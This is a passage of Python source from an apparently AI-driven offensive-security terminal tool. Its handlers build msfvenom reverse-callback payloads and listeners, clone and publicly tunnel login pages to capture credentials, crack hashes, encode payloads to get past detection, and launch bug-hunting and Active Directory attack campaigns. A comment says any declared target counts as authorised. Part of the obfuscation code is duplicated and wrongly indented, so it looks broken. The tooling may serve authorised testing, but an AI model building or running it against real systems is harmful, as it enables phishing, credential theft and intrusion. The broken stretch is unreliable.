            t.append(", ".join(spec.alternatives) + "\n", style=p.dim)

        if spec.notes:
            t.append("\n  NOTES\n", style=f"bold {p.accent}")
            for note in spec.notes:
                t.append("  · ", style=p.accent)
                t.append(note + "\n", style=p.dim)

        # The command, always — it is the thing an operator copies into their
        # own notes, and printing it is what makes --dry-run honest.
        out = Path(opts["out"]) if opts["out"] else Path(
            payload_mod.output_name(spec, opts["payload"]))
        argv = payload_mod.build_argv(
            spec, lhost=lhost, lport=lport, out=out, payload=opts["payload"],
            encoder=opts["encoder"], iterations=opts["iterations"],
            bad_chars=opts["bad_chars"],
            template=Path(opts["template"]) if opts["template"] else None,
        )
        t.append("\n  COMMAND\n", style=f"bold {p.accent}")
        t.append("  " + " ".join(payload_mod._quote(a) for a in argv) + "\n",
                 style=p.dim)

        if opts["handler_only"]:
            t.append("\n  HANDLER\n", style=f"bold {p.accent}")
            for line in payload_mod.handler_rc(
                    spec, lhost, lport, opts["payload"]).splitlines():
                t.append(f"  {line}\n", style=p.dim)
        return t

    def _payload_list(self) -> None:
        """Every extension this can build, grouped by target."""
        p = self.palette
        t = Text()
        t.append("  PAYLOAD\n\n", style=f"bold {p.accent}")
        t.append("  /payload <ext>", style=f"bold {p.primary}")
        t.append("   analyse the extension, build it, print the listener\n",
                 style=p.dim)
        t.append("  /payload <ext> --dry-run", style=f"bold {p.primary}")
        t.append("   print the command, build nothing\n", style=p.dim)
        t.append("  /payload <ext> --handler", style=f"bold {p.primary}")
        t.append("   the msfconsole listener only\n", style=p.dim)
        t.append("  /payload <ext> --template FILE", style=f"bold {p.primary}")
        t.append("   embed it in an existing artifact\n", style=p.dim)
        t.append("  /payload <ext> --lhost IP --lport N", style=f"bold {p.primary}")
        t.append("   set the callback\n", style=p.dim)

        groups: list[tuple[str, tuple[str, ...]]] = [
            ("ANDROID", ("apk",)),
            ("WINDOWS", ("exe", "dll", "msi", "ps1", "hta", "vbs", "vba", "bat")),
            ("LINUX / UNIX", ("elf", "so", "sh", "pl", "py", "rb", "js", "lua")),
            ("MACOS", ("macho", "dylib", "app")),
            ("JAVA", ("jar", "war", "jsp", "axis2")),
            ("WEB", ("aspx", "asp", "php")),
            ("SOURCE / SHELLCODE",
             ("c", "cs", "go", "nim", "rs", "zig", "asm", "bin", "b64", "hex",
              "txt")),
        ]
        for title, exts in groups:
            live = [e for e in exts if e in payload_mod.SPECS]
            if not live:
                continue
            t.append(f"\n  {title}\n", style=f"bold {p.accent}")
            for ext in live:
                spec = payload_mod.SPECS[ext]
                t.append(f"  {ext:<8}", style=f"bold {p.primary}")
                t.append(f"{spec.label:<26}", style=p.primary)
                t.append(spec.runs_on + "\n", style=p.dim)

        tool = payload_mod.probe_msfvenom()
        t.append("\n  MSFVENOM   ", style=f"bold {p.accent}")
        if tool.present:
            t.append(f"{tool.path}", style=p.primary)
            if tool.version:
                t.append(f"  ({tool.version})", style=p.dim)
            t.append("\n", style=p.dim)
        else:
            t.append("not installed — /payload cannot build anything\n",
                     style=p.amber)
            t.append("  ", style=p.dim)
            t.append("apt install metasploit-framework", style=p.primary)
            t.append("\n", style=p.dim)

        t.append("\n  Every pairing here was measured against a real msfvenom.\n",
                 style=p.dim)
        t.append("  Point it at targets you own or are authorised to test.\n",
                 style=p.amber)
        self.query_one(ChatPane).write_block(t)

    def _phish_usage(self) -> None:
        p = self.palette
        t = Text()
        t.append("  PHISH\n\n", style=f"bold {p.accent}")
        t.append("  /phish <host>     ", style=f"bold {p.primary}")
        t.append("clone the login page, serve it, tunnel it\n", style=p.dim)
        t.append("  /phish status     ", style=f"bold {p.primary}")
        t.append("show the live URLs and capture counts\n", style=p.dim)
        t.append("  /phish stop       ", style=f"bold {p.primary}")
        t.append("tear the campaign down\n", style=p.dim)
        t.append("\n  hits and credentials stream into ", style=p.dim)
        t.append("zim-pane", style=p.primary)
        t.append(" on the right.\n", style=p.dim)
        t.append("  campaigns land in ", style=p.dim)
        t.append(f"{Path(self.cfg.state_dir) / 'phish'}/<host>-<stamp>/\n",
                 style=p.primary)
        self.query_one(ChatPane).write_block(t)

    def _phish_status(self) -> None:
        camp = phish_mod.active()
        if camp is None or not camp.alive:
            self._sys_line("no phishing campaign is running", warn=True)
            return
        p = self.palette
        t = Text()
        t.append("  ◈ PHISH     ", style=f"bold {p.accent}")
        t.append(f"{camp.host}  ({'LIVE' if camp.alive else 'stopped'})\n",
                 style=p.primary)
        t.append("  ◈ LOCAL     ", style=f"bold {p.accent}")
        t.append(camp.local_url + "\n", style=p.primary)
        t.append("  ◈ PUBLIC    ", style=f"bold {p.accent}")
        t.append((camp.public_url or "none — LAN only") + "\n",
                 style=p.primary if camp.public_url else p.amber)
        t.append("  ◈ CLONE     ", style=f"bold {p.accent}")
        t.append(camp.clone_note + "\n", style=p.dim)
        t.append("  ◈ CAPTURED  ", style=f"bold {p.accent}")
        t.append(f"{len(camp.creds)} cred  ·  {len(camp.hits)} hit\n",
                 style=p.primary)
        self.query_one(ChatPane).write_block(t)

    def _phish_stop(self) -> None:
        camp = phish_mod.stop()
        pane = self._zim_pane()
        if pane is not None:
            pane.note({"kind": "stopped"})
        if camp is None:
            self._sys_line("no phishing campaign is running", warn=True)
            return
        self._sys_line(
            f"phish stopped — {camp.host}  ·  {len(camp.creds)} cred  ·  "
            f"{len(camp.hits)} hit  ·  {camp.directory}",
            ok=True,
        )

    @work(exclusive=True)
    async def _launch_phish(self, target: str) -> None:
        """Build the campaign off the UI thread: fetch + bind + tunnel."""
        self.busy = True
        bar = self.query_one(StatusBar)
        bar.set_activity("phish: cloning", busy=True)
        try:
            camp = await asyncio.to_thread(
                phish_mod.start,
                self.cfg,
                target,
                self._on_phish_event,
                tunnel=True,
            )
        except Exception as e:  # noqa: BLE001
            self.busy = False
            bar.set_activity("idle", busy=False)
            bar.render_bar()
            self._sys_line(f"phish failed: {type(e).__name__}: {e}", warn=True)
            pane = self._zim_pane()
            if pane is not None:
                pane.hide()
            self.query_one("#input", Input).focus()
            return

        self.busy = False
        bar.set_activity("idle", busy=False)
        bar.render_bar()

        p = self.palette
        t = Text()
        t.append("  ◈ LOCAL     ", style=f"bold {p.accent}")
        t.append(camp.local_url + "\n", style=p.primary)
        t.append("  ◈ PUBLIC    ", style=f"bold {p.accent}")
        if camp.public_url:
            t.append(camp.public_url, style=f"bold {p.accent}")
            if camp.tunnel.tool:
                t.append(f"  via {camp.tunnel.tool}", style=p.dim)
            t.append("\n")
        else:
            t.append("none — LAN only", style=p.amber)
            if camp.tunnel.error:
                t.append(f"  ({camp.tunnel.error})", style=p.dim)
            t.append("\n")
        t.append("  ◈ CLONE     ", style=f"bold {p.accent}")
        t.append(camp.clone_note + "\n", style=p.dim)
        t.append("  ◈ LOGS      ", style=f"bold {p.accent}")
        t.append(str(camp.directory) + "\n", style=p.dim)
        t.append("  · watch zim-pane for hits and credentials\n", style=p.dim)
        self.query_one(ChatPane).write_block(t)
        self.query_one("#input", Input).focus()

    def _on_phish_event(self, event: dict) -> None:
        """Called from the HTTP thread. Queue only — never touch widgets."""
        with self._phish_q_lock:
            self._phish_events.append(event)

    def _drain_phish(self) -> None:
        with self._phish_q_lock:
            batch = list(self._phish_events)
            self._phish_events.clear()
        if not batch:
            return
        pane = self._zim_pane()
        if pane is None:
            return
        for ev in batch:
            pane.note(ev)
            if ev.get("kind") == "cred":
                user = ev.get("user") or "?"
                self._sys_line(f"phish cred  {user}  ·  {self._mask(ev.get('password') or '')}")

    @staticmethod
    def _mask(secret: str) -> str:
        if not secret:
            return "(empty)"
        if len(secret) <= 2:
            return "•" * len(secret)
        return secret[0] + "•" * (len(secret) - 2) + secret[-1]

    def _zim_pane(self) -> ZimPane | None:
        try:
            return self.query_one(ZimPane)
        except Exception:
            return None

    # ---- /bug-hunt --------------------------------------------------------
    def _cmd_scope_validator(self, args) -> None:
        """/scope-validator — paste a programme overview; write the scope files,
        recon the in-scope hosts read-only, and rank them as a tree.

        Opens a multi-line box so the whole overview arrives intact. Runs as a
        worker, because it makes model calls and network requests.
        """
        if self.busy:
            self._sys_line("harness is busy — Ctrl+C to interrupt", warn=True)
            return

        def _got(text: str | None) -> None:
            if not text:
                self._sys_line("scope-validator cancelled", warn=True)
                return
            self._run_scope_validator(text)

        self.push_screen(ScopePasteScreen(self.palette), _got)

    @work(exclusive=True)
    async def _run_scope_validator(self, overview: str) -> None:
        from .. import scope_validator as sv
        p = self.palette
        chat = self.query_one(ChatPane)
        bar = self.query_one(StatusBar)

        self.busy = True
        self._cancelled = False
        self._set_rain(False)
        self._sys_line("scope-validator: reading the overview…")
        try:
            # 1. extract the structured scope from the pasted text
            bar.set_activity("scope: reading", busy=True)
            extracted = sv.parse_extraction(await self._collect_plain(
                sv.EXTRACT_PROMPT.format(overview=overview)))
            if extracted is None or not (extracted.in_scope or extracted.out_of_scope):
                self._sys_line(
                    "scope-validator: could not find any scope entries in that text — "
                    "nothing was written", warn=True)
                return
            if self._cancelled:
                return

            # 2. write and verify the scope files in the working directory
            allow, deny, skipped = sv.build_scope(extracted.in_scope, extracted.out_of_scope)
            dest = Path(self.cfg.workdir)
            allow_path, deny_path = sv.write_scope_files(
                dest, allow, deny, programme=extracted.programme)
            problems = sv.verify_scope_files(allow_path, deny_path)

            # 3. read-only recon of the in-scope hosts, deny-list respected
            hosts = [sv._host_of(e.asset) for e in extracted.in_scope]
            hosts = [h for h in dict.fromkeys(hosts) if h]
            self._sys_line(f"recon: {len(hosts)} in-scope host(s), read-only")
            bar.set_activity("scope: recon", busy=True)
            recon = await asyncio.to_thread(
                sv.recon_all, hosts, self.agent.scope)

            # 4. rank with the model, from the evidence
            bar.set_activity("scope: ranking", busy=True)
            in_assets = [e.asset for e in extracted.in_scope]
            ranked_raw = sv.parse_ranking(await self._collect_plain(
                sv.rank_prompt(extracted.programme, in_assets, recon)), in_assets)
            ranked, summary = ranked_raw if ranked_raw else (
                [sv.Ranked(a, i + 1, "unranked", "ranking unavailable") for i, a in enumerate(in_assets)],
                "")

            # 5. show the tree
            t = Text()
            t.append(f"  SCOPE VALIDATOR — {extracted.programme or 'programme'}\n\n",
                     style=f"bold {p.accent}")
            t.append(f"  wrote  {allow_path}\n", style=p.primary)
            t.append(f"  wrote  {deny_path}\n", style=p.primary)
            if skipped:
                t.append(f"  skipped {len(skipped)} asset(s) the guard cannot hold: "
                         f"{', '.join(skipped[:6])}\n", style=p.amber)
            for prob in problems:
                t.append(f"  ⚠ {prob}\n", style=p.amber)
            if extracted.rules:
                t.append("\n  RULES\n", style=f"bold {p.accent}")
                for rule in extracted.rules[:12]:
                    t.append(f"    · {rule}\n", style=p.dim)
            t.append("\n  TARGET ORDER\n", style=f"bold {p.accent}")
            if summary:
                t.append(f"  {summary}\n", style=p.primary)
            for r in ranked:
                host = sv._host_of(r.asset)
                t.append(f"    #{r.rank} ", style=f"bold {p.accent}")
                t.append(f"[{r.value}] ", style=p.dim)
                t.append(f"{r.asset}\n", style=p.primary)
                if host in recon:
                    t.append(f"        {sv.recon_line(recon[host])}\n", style=p.dim)
                if r.why:
                    t.append(f"        why: {r.why}\n", style=p.dim)
            if extracted.out_of_scope:
                t.append(f"\n  OUT OF SCOPE ({len(extracted.out_of_scope)})\n",
                         style=f"bold {p.accent}")
                for e in extracted.out_of_scope[:20]:
                    t.append(f"    ✕ {e.asset}", style=p.primary)
                    if e.note:
                        t.append(f" — {e.note}", style=p.dim)
                    t.append("\n")
            t.append("\n  The scope files are a declaration of what you are cleared "
                     "to test. Check them before you run a tool.\n", style=p.dim)
            chat.write_block(t)

            # The guard is re-read so the new files take effect this session.
            self.agent.scope = Scope.load(allow_path, deny_path)
            self._sync_rails()
        except Exception as e:  # noqa: BLE001 - surface, never leave the UI busy
            self._sys_line(f"scope-validator failed: {type(e).__name__}: {e}", warn=True)
        finally:
            self.busy = False
            bar.set_activity("", busy=False)

    async def _collect_plain(self, prompt: str) -> str:
        """One model turn with no tools, returning only its text."""
        parts: list[str] = []
        planner = self._team_agent_factory(
            dataclasses.replace(self.cfg, mode="plan"))
        async for ev in planner.run_turn(prompt):
            if ev.get("type") == "text_delta":
                parts.append(ev.get("text", ""))
        return "".join(parts)

    def _cmd_bug_hunt(self, args) -> None:
        """/bug-hunt [--fresh] [--wave N] <target> — recon, then one wave.

        Recon maps the target (or reuses notes already on disk), a read-only
        planner writes ten briefs, all ten run at once, their findings land in
        the wave's own directory — and the command stops there. Whether there is
        another wave is the operator's call, which is the point: a campaign that
        planned wave 2 straight after wave 1 found a critical was spending
        tokens on work nobody asked for and could not decline. See
        zimzilla/hunt.py.

        ``--wave N`` runs wave N specifically; without it the next wave the
        scope has not run yet. ``--fresh`` forces the mapping phase even when
        recon is on disk, for a target that has changed since the notes were
        written.
        """
        # The flags may sit either side of the target, because both read
        # naturally and an operator who has to remember which is which will get
        # it wrong. Stripped before the target is joined, so a stray flag never
        # reaches scope_slug and becomes part of a directory name.
        fresh = any(a in ("--fresh", "-f") for a in args)
        rest = [a for a in args if a not in ("--fresh", "-f")]

        # --wave takes a value, so it is parsed rather than filtered: the flag
        # and the number after it are both consumed, and every malformed form
        # is refused here rather than becoming part of the target string.
        wave_number: int | None = None
        stripped: list[str] = []
        i = 0
        while i < len(rest):
            arg = rest[i]
            if arg == "--wave" or arg.startswith("--wave="):
                value = arg.partition("=")[2] if "=" in arg else (
                    rest[i + 1] if i + 1 < len(rest) else "")
                if "=" not in arg:
                    i += 1  # consume the value too
                if not value:
                    self._sys_line(
                        "--wave needs a number, e.g. /bug-hunt x.com --wave 2",
                        warn=True)
                    return
                if not value.isdigit() or int(value) < 1:
                    self._sys_line(
                        f"⚠ --wave takes a wave number of 1 or more, not "
                        f"{value!r}. Wave 0 is recon — it has no briefs to "
                        "run.", warn=True)
                    return
                wave_number = int(value)
            else:
                stripped.append(arg)
            i += 1
        rest = stripped

        if not rest:
            self._hunt_usage()
            return

        target = " ".join(rest).strip()

        if self.busy:
            self._sys_line("harness is busy — Ctrl+C to interrupt", warn=True)
            return

        # Warn but proceed. AGENTS.md treats any target the operator declares as
        # authorised, so an unarmed session is a notice, not a refusal — but the
        # out-of-scope guard still hard-blocks mid-hunt, and an operator who
        # does not know the session is unarmed would read that as a failure.
        allowed, reason = self.agent.scope.allows(target)
        p = self.palette
        if not allowed:
            self._sys_line(f"⚠ not in allow.yaml — {reason}", warn=True)
            self._sys_line("hunting anyway; out-of-scope hosts stay hard-blocked")

        # The scope decides the directory, and a target that is not host-shaped
        # is refused here rather than slugged into a misleading folder name.
        # This used to accept anything: a sentence typed into the target field
        # became a directory named after its first sixty characters.
        try:
            directory = hunt_mod.case_dir(self.cfg, target)
        except ValueError as e:
            self._sys_line(f"⚠ {e}", warn=True)
            return

        # What recon the campaign will actually run. Probed here rather than
        # only reported once the campaign starts, because "we already have this
        # mapped" is the fact that decides whether the operator waits minutes or
        # gets briefs immediately — and they should know before, not after.
        reused = None if fresh else hunt_mod.find_recon(directory)

        t = Text()
        t.append("  ◈ HUNT      ", style=f"bold {p.accent}")
        t.append(f"{target}\n", style=f"bold {p.primary}")
        t.append("  ◈ RECON     ", style=f"bold {p.accent}")
        if fresh:
            t.append("--fresh — remapping the target\n", style=p.primary)
        elif reused is not None:
            t.append(
                f"reusing notes from {reused.path.name} "
                f"({reused.age_days}d old) — no remap\n",
                style=p.primary,
            )
        else:
            t.append("mapping the surface\n", style=p.primary)
        # The wave that will actually run. Without --wave it is the next one the
        # scope has not run, which for a repeat hunt is not 1 — and an operator
        # who cannot see the number cannot tell whether they are continuing a
        # campaign or overwriting it.
        running = wave_number or hunt_mod.next_wave_number(directory)
        t.append("  ◈ WAVE      ", style=f"bold {p.accent}")
        t.append(f"wave {running} — ", style=f"bold {p.primary}")
        t.append(
            f"{hunt_mod.HUNT_WAVE_SIZE} agents, all concurrent, then it stops\n"
            if wave_number is None else
            f"{hunt_mod.HUNT_WAVE_SIZE} agents, all concurrent\n",
            style=p.primary,
        )
        t.append("  ◈ EVIDENCE  ", style=f"bold {p.accent}")
        t.append(str(directory) + "\n", style=p.dim)
        t.append("  ◈ NOTICE    ", style=f"bold {p.amber}")
        t.append(
            "authorised use only — your own asset, a consented audit, "
            "or a declared engagement\n",
            style=p.dim,
        )
        t.append("  · ", style=p.dim)
        t.append("/stop-hunt", style=p.primary)
        t.append(" ends the wave   ·   ", style=p.dim)
        t.append("/summary-hunt", style=p.primary)
        t.append(" writes the report   ·   ", style=p.dim)
        t.append("/report-bug-hunt", style=p.primary)
        t.append(" evidence only   ·   ", style=p.dim)
        t.append("/findings", style=p.primary)
        t.append(" shows the tracker\n", style=p.dim)
        self.query_one(ChatPane).write_block(t)

        pane = self._zim_pane()
        if pane is not None:
            pane.show_hunt(target, hunt_mod.HUNT_WAVE_SIZE)

        self._run_hunt(target, fresh=fresh, wave_number=wave_number)

    def _hunt_usage(self) -> None:
        p = self.palette
        t = Text()
        t.append("  BUG HUNT\n\n", style=f"bold {p.accent}")
        t.append("  /bug-hunt <target>   ", style=f"bold {p.primary}")
        t.append("recon, then the next wave of 10 agents, then stop\n", style=p.dim)
        t.append("  /bug-hunt <target> --wave N  ", style=f"bold {p.primary}")
        t.append("run wave N specifically (wave 1 first)\n", style=p.dim)
        t.append("  /bug-hunt --fresh <target>  ", style=f"bold {p.primary}")
        t.append("remap even if recon is already on disk\n", style=p.dim)
        t.append("  /stop-hunt           ", style=f"bold {p.primary}")
        t.append("end the wave and print what it found\n", style=p.dim)
        t.append("  /summary-hunt        ", style=f"bold {p.primary}")
        t.append("the report — what each wave did (works mid-wave)\n", style=p.dim)
        t.append("  /report-bug-hunt     ", style=f"bold {p.primary}")
        t.append("evidence only, every wave, no narrative\n", style=p.dim)
        t.append("  /findings            ", style=f"bold {p.primary}")
        t.append("the tracker — every bug found, worst first\n", style=p.dim)
        t.append("\n  Each wave: the planner reads what every earlier wave found and\n",
                 style=p.dim)
        t.append("  aims the next ten somewhere new. Run it under ", style=p.dim)
        t.append("/mode zim", style=p.primary)
        t.append(" so the\n  agents follow your AGENTS.md doctrine.\n", style=p.dim)
        t.append("\n  evidence lands in ", style=p.dim)
        t.append(f"{Path(self.cfg.state_dir) / 'hunts'}/<scope>/\n",
                 style=p.primary)
        t.append("  one directory per scope, reused, and one directory per wave:\n",
                 style=p.dim)
        t.append("  wave-N/plan.md and wave-N/findings/ sit together, so the tree\n",
                 style=p.dim)
        t.append("  says what each wave aimed at and what it found\n", style=p.dim)
        self.query_one(ChatPane).write_block(t)

    # ---- /crack ------------------------------------------------------------
    def _cmd_crack(self, args) -> None:
        """/crack <file|dir> [--mode N] [--max-time S] [--deep] — crack hashes offline.

        A router, like `/osint`: identify what is in the file, work out what is
        affordable on *this* host, print that arithmetic, then hand the playbook
        to the main agent as one turn. The estimate is the feature — there is no
        GPU here, and an operator who starts a rule set against a Kerberoast hash
        without knowing it is a ten-minute run will cancel it.
        """
        p = self.palette

        path_arg, mode, max_time, deep, err = _parse_crack_args(args)
        if err:
            self._sys_line(err, warn=True)
            return
        if not path_arg:
            self._sys_line(
                "usage: /crack <file|dir> [--mode N] [--max-time S] [--deep]",
                warn=True)
            return

        source, verr = crack_mod.validate_path(path_arg)
        if source is None:
            self._sys_line(verr, warn=True)
            return

        if shutil.which("hashcat") is None:
            self._sys_line(
                "hashcat is not installed — /crack drives hashcat. Install it "
                "(apt install hashcat) and try again.", warn=True)
            return

        if self.busy:
            self._sys_line("harness is busy — Ctrl+C to interrupt", warn=True)
            return

        detected = crack_mod.identify(source)
        # A `--mode` the operator gave wins; otherwise the most prevalent format
        # found. A file that identifies as nothing still runs — the playbook
        # tells the agent to establish the mode with `--identify` — but the
        # banner has to say the estimate is unknown rather than invent one.
        chosen = mode if mode is not None else (detected[0].mode if detected else None)

        case = crack_mod.case_dir(self.cfg, source)
        pot = crack_mod.potfile(self.cfg)

        t = Text()
        t.append("  ⚒ TARGET    ", style=f"bold {p.accent}")
        t.append(f"{source}\n", style=p.primary)
        t.append("  ⚒ EVIDENCE  ", style=f"bold {p.accent}")
        t.append(str(case) + "\n", style=p.dim)
        t.append("  ⚒ POTFILE   ", style=f"bold {p.accent}")
        t.append(f"{pot}  (shared across runs)\n", style=p.dim)

        if detected:
            t.append("  ⚒ FORMATS   ", style=f"bold {p.accent}")
            t.append(", ".join(
                f"{d.name} ×{d.count}" for d in detected) + "\n", style=p.primary)
        else:
            t.append("  ⚒ FORMATS   ", style=f"bold {p.accent}")
            t.append("none recognised — the agent will run `hashcat --identify`\n",
                     style=p.amber)

        if chosen is not None:
            rate = crack_mod.rate_for(chosen)
            t.append("  ⚒ RATE      ", style=f"bold {p.accent}")
            t.append(
                f"{crack_mod.HASH_MODES.get(chosen, (f'mode {chosen}',))[0]} · "
                f"{rate / 1e6:,.1f} MH/s  ", style=p.primary)
            t.append("(CPU only — this host has no GPU)\n", style=p.dim)

            plan = crack_mod.plan(chosen, max_time, deep=deep)
            t.append("  ⚒ PLAN      ", style=f"bold {p.accent}")
            t.append(f"budget {crack_mod.human_time(max_time)}\n", style=p.primary)
            for ps in plan:
                mark = "run " if ps.run else "skip"
                style = p.primary if ps.run else p.dim
                t.append(f"      [{mark}] ", style=style)
                t.append(f"{ps.stage.name:<38}", style=style)
                t.append(f"~{crack_mod.human_time(ps.seconds):>7}", style=style)
                if not ps.run:
                    t.append(f"   {ps.reason}", style=p.dim)
                t.append("\n")
        else:
            t.append("  ⚒ PLAN      ", style=f"bold {p.accent}")
            t.append("cannot estimate until the mode is known\n", style=p.amber)

        t.append("  ⚒ NOTICE    ", style=f"bold {p.amber}")
        t.append(
            "authorised use only — hashes you are entitled to test\n", style=p.dim)
        self.query_one(ChatPane).write_block(t)

        prompt = crack_mod.build_prompt(self.cfg, source, case, detected, max_time)
        label = f"⚒ /crack {source.name}" if source.is_file() else f"⚒ /crack {source}"
        self._run_turn(
            prompt,
            display=label,
            finalise=lambda: self._finalise_crack(case),
            # Same shape as /osint: the run exists to produce report.md, so it
            # gets the same nudge-then-report-honestly treatment.
            deliverable=Deliverable(path=case / "report.md", label="report.md"),
        )

    def _finalise_crack(self, case: Path) -> None:
        """Archive the run's report, and keep the case directory.

        Deliberately not osint's policy: osint deletes its case because the
        clones and API dumps have no further use, but a crack case holds the hash
        copy and the potfile, and the potfile is what makes a *second* run pick
        up where this one stopped. So the report is copied out to
        ``<state_dir>/reports/`` and the case stays.
        """
        report = crack_mod.finalise_case(self.cfg, case)
        if report is not None:
            self._sys_line(f"report archived: {report}", ok=True)
            self._sys_line(f"case kept (potfile and hashes): {case}")
        else:
            self._sys_line(
                f"no report found — case kept for inspection: {case}", warn=True)

    def _cmd_obfuscate(self, args) -> None:
        """Handle /obfuscate <file>"""
        from zimzilla import obfuscate as ob_mod

        if not args:
            ob_mod.print_usage()
            return

        filepath = args[0]

        if not os.path.isfile(filepath):
            self._sys_line(f"error: '{filepath}' is not a file", warn=True)
            return

        # Analyze the file
        analysis = ob_mod.analyze_payload_file(filepath)

        # Display analysis in the TUI
        self._sys_line(f"  Obfuscation Analysis: {filepath}", ok=True)
        self._sys_line(f"    Extension: .{__import__('pathlib').Path(filepath).suffix.lstrip('.').lower()}", ok=False)
        self._sys_line(f"    Category: {analysis['category'].upper()}", ok=False)
        self._sys_line(f"    Description: {analysis['description']}", ok=False)

        if analysis['default_payload']:
            self._sys_line(f"    Default payload: {analysis['default_payload']}", ok=False)

        self._sys_line("")
        self._sys_line("  Recommended encoders:", ok=False)
        for rec in analysis['encoders']:
            enc = rec["name"]
            it = rec["iterations"]
            notes = rec["notes"] if rec["notes"] else ""
            self._sys_line(f"    - {enc} (iterations={it})", ok=False)
            if notes:
                self._sys_line(f"      Notes: {notes}", ok=False)

        self._sys_line("")
        self._sys_line("  Usage: place the file in a directory you own and test delivery", ok=True)
    def _cmd_obfuscate_run(payload, encoder, iterations, lhost, lport, dry_run):
        """Run the obfuscation or print the command."""
        from zimzilla import obfuscate as ob_mod

        # Validate the pairing exists in the table (optional but helpful)
        key = f"{payload}+{encoder}"
        spec = ob_mod.SPECS.get(key)

        lhost_val = lhost or "127.0.0.1"
        lport_val = lport or 4444

        if dry_run:
            argv = ob_mod.build_argv(payload, encoder, iterations, lhost_val, lport_val)
            print("  COMMAND (copy-paste this into your shell):")
            print("  " + " ".join(argv))
            print()
            print("  NOTES:")
            if spec:
                for note in spec.notes:
                    print(f"  · {note}")
            else:
                print("  · (no table entry -- verify the pairing with a real msfvenom run)")
            print()
            print("  The output will be the encoder-encoded payload.")
            return

        # Run the build
        result = ob_mod.generate(payload, encoder, iterations, lhost_val, lport_val)

        if not result["ok"]:
            print(f"  build failed: {result['error']}")
            print()
            print("  full stderr:")
            print(f"  {result['stderr']}")
            print()
            print("  full stdout (first 500 chars):")
            print(f"  {result['stdout'][:500]}")
            return

        print("  build succeeded")
        print()
        print("  argv: " + " ".join(result["argv"]))
        print()
        print("  encoded output (first 500 chars):")
        print(f"  {result['stdout'][:500]}")
        print()
        if result["sha256"]:
            print(f"  sha256: {result['sha256']}")
        if result["size"]:
            from zimzilla.reverse import human_size
            print(f"  size: {human_size(result['size'])}")
        print()
        print("  stderr (notes from msfvenom):")
        print(f"  {result['stderr'][:500]}")

    def _cmd_obfuscate_list():
        """List every encoder/payload pairing this can run."""
        ob_mod = __import__('zimzilla.obfuscate', fromlist=['SPECS'])
        SPECS = ob_mod.SPECS

        print("  /obfuscate <payload> <encoder> [--iterations N] [--lhost IP] [--lport N]")
        print("  /obfuscate <payload> <encoder> --dry-run")
        print()
        print("  Available pairings (payload + encoder):")
        print()

        # Show all entries from SPECS, grouped by payload
        payloads_seen = set()
        for key, spec in sorted(SPECS.items()):
            payload = spec.payload
            if payload not in payloads_seen:
                payloads_seen.add(payload)
                print(f"  {payload}:")
            enc_name = f"{spec.encoder} (it={spec.iterations})"
            notes = "  " + "; ".join(spec.notes) if spec.notes else "  (no notes)"
            print(f"    - {enc_name}: {notes}")

        # Also list available encoders
        print()
        print("  Available msfvenom encoders:")
        encoders_list = ob_mod.encoders()
        if encoders_list:
            for e in encoders_list[:20]:
                print(f"    - {e}")
            if len(encoders_list) > 20:
                print(f"    ... and {len(encoders_list) - 20} more")
        else:
            print("    (msfvenom not installed)")

        print()
        print("  Every pairing above was measured against a real msfvenom run.")
        print("  Point it at targets you own or are authorised to test.")

    def _cmd_obfuscate(argv):
        """Entry point for /obfuscate command."""
        from zimzilla import obfuscate as ob_mod

        if not argv:
            _cmd_obfuscate_list()
            return

        # argv[0] = payload, argv[1] = encoder, rest = flags
        if len(argv) < 2:
            print("error: /obfuscate requires a payload and an encoder")
            print(_cmd_obfuscate.__doc__.split('"""')[1] if '"""' in _cmd_obfuscate.__doc__ else "")
            return

        payload = argv[0]
        encoder = argv[1]

        # Parse flags from argv[2:]
        dry_run = False
        iterations = 1
        lhost = None
        lport = None

        i = 2
        while i < len(argv):
            arg = argv[i]
            if arg == "--dry-run":
                dry_run = True
            elif arg == "--iterations" and i + 1 < len(argv):
                try:
                    iterations = int(argv[i + 1])
                    if iterations < 1:
                        print("error: --iterations must be >= 1")
                        return
                except ValueError:
                    print(f"error: --iterations takes a positive integer, not {argv[i + 1]!r}")
                    return
                i += 2
            elif arg == "--lhost" and i + 1 < len(argv):
                lhost = argv[i + 1]
                i += 2
            elif arg == "--lport" and i + 1 < len(argv):
                try:
                    lport = int(argv[i + 1])
                    if not (1 <= lport <= 65535):
                        print(f"error: --lport must be 1-65535, not {lport}")
                        return
                except ValueError:
                    print(f"error: --lport takes a port number, not {argv[i + 1]!r}")
                    return
                i += 2
            else:
                print(f"error: unexpected argument {arg!r}")
                return

        _cmd_obfuscate_run(payload, encoder, iterations, lhost, lport, dry_run)

    
    # ---- /ad ---------------------------------------------------------------
    def _cmd_ad(self, args) -> None:
        """/ad <domain> --ack <domain> — an Active Directory campaign.

        `/bug-hunt` with a different doctrine and a safety interlock, and one
        gate in front of it. The gate is the operator typing the domain back:
        not a security control, a speed bump that makes "I am about to run
        credential attacks against *this* domain" something they had to say.
        Everything about why is in zimzilla/ad.py.

        ``--wave N``, ``--fresh`` and the rest of the flag handling are
        `/bug-hunt`'s, parsed the same way, because they mean the same thing —
        the wave model is the engine's and the doctrine does not change it.
        ``--lockout N`` is AD's alone: it is the number the interlock is built
        from, and getting it wrong is the one mistake here that costs a client
        their Monday.
        """
        p = self.palette

        # `/ad tools` — the probe on demand. Answers while busy, because "what
        # does this box actually have" is worth asking mid-campaign and starts
        # no turn. Checked before anything else so it needs no target.
        if args and args[0].lower() == "tools":
            self._cmd_ad_tools()
            return

        # --fresh/-f is a bare flag, so it is filtered rather than parsed.
        fresh = any(a in ("--fresh", "-f") for a in args)
        rest = [a for a in args if a not in ("--fresh", "-f")]

        # --arm is the opt-in to the destructive verbs. Off unless asked for,
        # and named in the banner either way so an armed run is never invisible.
        armed = any(a in ("--arm",) for a in args)
        rest = [a for a in rest if a != "--arm"]

        # The value-taking flags, parsed together: each consumes the token after
        # it, and every malformed form is refused here rather than becoming part
        # of the domain string. `--ack` is the exception — its value is the
        # domain itself, so it is captured rather than validated as a number.
        wave_number: int | None = None
        lockout = ad_mod.DEFAULT_LOCKOUT
        ack: str | None = None
        stripped: list[str] = []
        i = 0
        while i < len(rest):
            arg = rest[i]
            name = arg.partition("=")[0]
            if name in ("--wave", "--lockout", "--ack"):
                value = arg.partition("=")[2] if "=" in arg else (
                    rest[i + 1] if i + 1 < len(rest) else "")
                if "=" not in arg:
                    i += 1  # consume the value too
                if not value:
                    self._sys_line(f"{name} needs a value, e.g. "
                                   f"/ad corp.local {name} "
                                   f"{'3' if name != '--ack' else 'corp.local'}",
                                   warn=True)
                    return
                if name == "--ack":
                    ack = value
                elif not value.isdigit() or int(value) < 1:
